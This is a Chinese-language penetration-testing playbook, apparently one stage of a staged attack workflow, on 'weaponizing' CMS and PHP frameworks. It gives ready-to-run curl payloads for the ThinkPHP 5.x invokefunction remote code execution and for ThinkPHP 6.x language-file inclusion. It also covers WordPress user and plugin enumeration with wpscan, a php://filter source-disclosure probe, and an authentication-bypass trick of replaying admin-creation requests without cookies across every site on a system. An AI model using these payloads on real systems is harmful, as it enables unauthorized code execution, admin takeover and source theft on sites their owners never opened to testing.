---
id: cms-playbook
title: CMS/框架武器化手册（ThinkPHP/WordPress/PHP 通用）
tags: cms,thinkphp,wordpress,php,s4
---
# CMS/框架武器化（三通道之③组件剧本）

## ThinkPHP（多版本特征路由）
```bash
# 特征：/index.php?s=/... 或 ?s= 路由；报错页显示 ThinkPHP 版本
curl -sk 'https://目标/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1' | grep -o 'PHP Version[^<]*' | head -1
# 5.0.x/5.1.x invokefunction RCE：phpinfo 探针确认 → 命令执行转 S5
# 6.x 多语言 lang 参数包含（ThinkPHP 多语言文件包含——无 CVE 编号流传，以版本检索输出为准）：lang=../../../../usr/local/etc/php/conf.d 探针
```

## WordPress
```bash
# 指纹：/wp-login.php、/wp-json、readme.html、?p=1
curl -sk https://目标/wp-json/wp/v2/users | jq -r '.[].slug' 2>/dev/null    # 用户枚举
wpscan --url https://目标/ --enumerate vp,vt,u --plugins-detection mixed --api-token <可选> \
  --request-optimizations --throttle 30    # 插件/主题/用户枚举，限速
# 枚举出的插件版本 → cve-weaponization 逐个检索 → 验证按 PoC 分级
```

## 通用 PHP
```bash
# phpinfo 泄露：/phpinfo.php /test.php /info.php（document_root/upload_tmp_dir 值记录）
# 文件包含判定：page/include 等参数 → path-traversal 手册接手
# php://filter 探针：?page=php://filter/convert.base64-encode/resource=index （读源码=确证）
```

## 纪律
- wpscan 枚举限速（--throttle），不爆破（爆破走 weak-cred-bruteforce 且 ROE 允许）
- CMS 漏洞验证：未授权读/探针类在 S4；写/执行类转 S5

## 后台通杀两式

- **删 cookie 重放**：后台"用户管理→添加管理员"包删除认证 cookie 后重放，成功=未鉴权 → 改 Host 打同系统全部站点（通杀）
- **文库联动**：peiqi/零组文库找已知漏洞系统 → 先黑盒打一遍 → 拿不到再找源码白盒审计二开